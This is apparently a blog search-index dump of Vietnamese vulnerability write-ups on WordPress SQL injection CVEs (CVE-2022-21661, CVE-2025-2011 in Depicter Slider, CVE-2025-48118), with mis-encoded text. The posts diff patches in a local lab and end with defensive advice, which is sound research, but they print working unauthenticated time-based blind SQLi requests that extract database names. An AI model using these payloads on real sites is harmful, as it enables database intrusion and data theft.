0, 10 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nGi·∫£i th√≠ch k·ªπ thu·∫≠t (subquery trong m·ªánh ƒë·ªÅ FROM):\nPayload d√πng m·ªôt subquery trong m·ªánh ƒë·ªÅ FROM: FROM (SELECT SLEEP(5)) a. MySQL ph·∫£i th·ª±c thi truy v·∫•n con tr∆∞·ªõc, t·∫°o ra m·ªôt b·∫£ng t·∫°m t·ª´ k·∫øt qu·∫£ c·ªßa subquery, r·ªìi m·ªõi ti·∫øp t·ª•c th·ª±c thi truy v·∫•n ch√≠nh. SELECT SLEEP(5) s·∫Ω l√†m cho truy v·∫•n con ch·∫≠m 5 gi√¢y ‚Äî do ƒë√≥ th·ªùi gian tr·∫£ v·ªÅ c·ªßa c·∫£ truy v·∫•n tƒÉng t∆∞∆°ng ·ª©ng, cho th·∫•y payload ƒë∆∞·ª£c th·ª±c thi. L∆∞u √Ω v·ªÅ cache v√† s·ªë l∆∞·ª£ng h√†ng (rows):\nMySQL c√≥ th·ªÉ t·ªëi ∆∞u/cached m·ªôt s·ªë k·∫øt qu·∫£ con; trong tr∆∞·ªùng h·ª£p c·ª• th·ªÉ n√†y SELECT SLEEP(5) ch·ªâ c·∫ßn th·ª±c thi 1 l·∫ßn ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, n√™n th·∫•y ƒë√∫ng m·ªôt l·∫ßn ƒë·ªô tr·ªÖ. N·∫øu ph·∫ßn tr∆∞·ªõc c·ªßa bi·ªÉu th·ª©c AND tr·∫£ v·ªÅ nhi·ªÅu h√†ng v√† payload ƒë∆∞·ª£c l·ªìng theo c√°ch g√¢y l·∫∑p, th·ªùi gian tr·∫£ v·ªÅ c√≥ th·ªÉ tƒÉng theo c·∫•p s·ªë (t·ª©c l√† nh√¢n l√™n theo s·ªë h√†ng), d·∫´n t·ªõi ƒë·ªô tr·ªÖ l·ªõn h∆°n nhi·ªÅu ‚Äî v√¨ truy v·∫•n con c√≥ th·ªÉ b·ªã th·ª±c thi cho m·ªói h√†ng t√πy c√°ch optimizer x·ª≠ l√Ω truy v·∫•n. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nThay gi√° tr·ªã c·ªßa terms b·∫±ng payload SQLi v√† g·ª≠i request qua Burp Suite:\nGET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),0))a)+%23+ HTTP/1.1 S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(w)\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nConclusion L·ªó h·ªïng CVE-2022-21661 trong WordPress Core tr∆∞·ªõc phi√™n b·∫£n 5.8.3, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n 3.7.37, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (sanitization) kh√¥ng ƒë√∫ng c√°ch trong WP_Query d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query ƒë·ªÉ th·ª±c thi.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t WordPress v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nCVE-2022-21661 Detail Notes V√¨ patch n·∫±m trong file src/wp-includes/class-wp-tax-query.php File n√†y ƒë·ªãnh nghƒ©a class WP_Tax_Query, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë tax_query trong WP_Query. V√¨ th·∫ø, n·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh parse/validate c·ªßa tax_query.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"//localhost:1313/vi/posts/2025-09-15-cve-2022-21661/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eDo vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (\u003cstrong\u003esanitization\u003c/strong\u003e) kh√¥ng ƒë√∫ng c√°ch trong \u003ccode\u003eWP_Query\u003c/code\u003e, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra \u003cstrong\u003eSQL Injection\u003c/strong\u003e th√¥ng qua c√°c \u003cstrong\u003eplugin\u003c/strong\u003e ho·∫∑c \u003cstrong\u003etheme\u003c/strong\u003e s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n \u003cstrong\u003e5.8.3\u003c/strong\u003e. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n \u003cstrong\u003e3.7.37\u003c/strong\u003e.\u003c/p\u003e","title":"CVE-2022-21661"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php\nindex, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController\npublic function index(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::lead()-\u0026gt;get($args); $statusCode = isset($response[\u0026#39;errors\u0026#39;]) ? 400 : 200; return \\Depicter::json($response)-\u0026gt;withStatus($statusCode); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function export(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); // other logic return \\Depicter::json([ \u0026#39;errors\u0026#39; =\u0026gt; [__(\u0026#39;error occurred during the export process\u0026#39;, \u0026#39;depicter\u0026#39;)] ])-\u0026gt;withStatus(400); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nC·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.\nHow it work? ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize\nN·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. {: .prompt-tip }\ntextfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL\npublic static function sql( $input ) { return esc_sql( $input ); } {: file=\u0026ldquo;vendor/averta/wordpress/src/Utility/Sanitize.php v3.2\u0026rdquo; }\nV√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.\nƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.\nüëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026amp;param1=param1_here\u0026amp;paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController\nC·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list\nKhi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u0026gt;get($args). Tuy nhi√™n, ph∆∞∆°ng th·ª©c get() l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn \\Depicter::leadRepository()-\u0026gt;getResults($args), t·ª©c l√† c√πng m·ªôt logic m√† h√†m list ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m list l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;ids\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;ids\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;sources\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;sources\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateStart\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateStart\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateEnd\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateEnd\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;order\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;order\u0026#39;, \u0026#39;DESC\u0026#39;)), \u0026#39;orderBy\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;orderBy\u0026#39;, \u0026#39;id\u0026#39;)), \u0026#39;page\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;page\u0026#39;, 1)), \u0026#39;perPage\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;perpage\u0026#39;, 10)), \u0026#39;columns\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;columns\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;includeFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;includeFields\u0026#39;, false)), \u0026#39;skipCustomFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;skipCustomFields\u0026#39;, false)) ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nƒê·ªÉ bi·∫øt getResults th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function getResults ho·∫∑c Ctrl + Click v√†o getResults\nüëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m getResults. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class LeadRepository v√† h√†m leadRepository(), nhi·ªÅu kh·∫£ nƒÉng Depicter::leadRepository() s·∫Ω tr·∫£ v·ªÅ m·ªôt instance c·ªßa class LeadRepository. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m getResults n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.\nTa th·∫•y ƒëi·ªÅu ki·ªán if,khi kh√¥ng c√≥ param includeFields th√¨ getLeadsResults s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t getLeadsResults trong c√πng class:\nprotected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u0026gt;lead()-\u0026gt;getTable(); $leads = Lead::new()-\u0026gt;select( \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;{$leadTable}.source_id\u0026#34;, \u0026#34;{$leadTable}.content_id\u0026#34;, \u0026#34;{$leadTable}.content_name\u0026#34;, \u0026#34;{$leadTable}.created_at\u0026#34;, \u0026#34;lf.name as fieldName\u0026#34;, \u0026#34;lf.value as fieldValue\u0026#34; )-\u0026gt;join( \u0026#34;{$this-\u0026gt;leadField()-\u0026gt;getTable()} AS lf\u0026#34;, \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;lf.lead_id\u0026#34; ); // other logic if( ! empty( $args[\u0026#39;s\u0026#39;] ) ){ $search = \u0026#34;\u0026#39;%\u0026#34;. $args[\u0026#39;s\u0026#39;] .\u0026#34;%\u0026#39;\u0026#34;; $leads-\u0026gt;appendRawWhere(\u0026#39;AND\u0026#39;, \u0026#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\u0026#34;); } $results = $this-\u0026gt;paginate( $leads, $args ); } {: file=\u0026ldquo;app/src/Database/Repository/LeadRepository.php v3.2\u0026rdquo; }\nTa th·∫•y param s, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m appendRawWhere. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:\nAND (lf.value like \u0026#39;%s_here%\u0026#39; OR leadtable.content_name like \u0026#39;%s_here%\u0026#39;) üëâ Nh∆∞ v·∫≠y khi g·ª≠i GET request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi params:\naction=depicter-lead-index\u0026amp;s=payload_here list ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param s ƒë∆∞·ª£c th√™m v√†o $args, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh getResults ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $args ƒêi·ªÅu ki·ªán if( ! $args['includeFields'] ) trong getResults khi includeFields m·∫∑c ƒë·ªãnh l√† false =\u0026gt; getLeadsResults ƒë∆∞·ª£c g·ªçi Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload ƒë∆∞·ª£c decode:\n999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh\nAND (lf.value like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- \u0026#39; OR leadtable.content_name like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #\u0026#39;) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nSubquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ s ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-2011 trong plugin WordPress Depicter Slider tr∆∞·ªõc phi√™n b·∫£n 3.6.2, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ escape SQL khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi '%...%'\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Depicter Slider Plugin \u0026lt;= 3.6.1 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-11-cve-2025-2011/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eDepicter Slider\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-2011\"\u003eCVE-2025-2011\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/depicter/\"\u003eWordPress Depicter Slider Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.6.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDepicter Slider\u003c/strong\u003e:  v3.6.1(vul) v√† v3.6.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-2011"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php\nNh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file 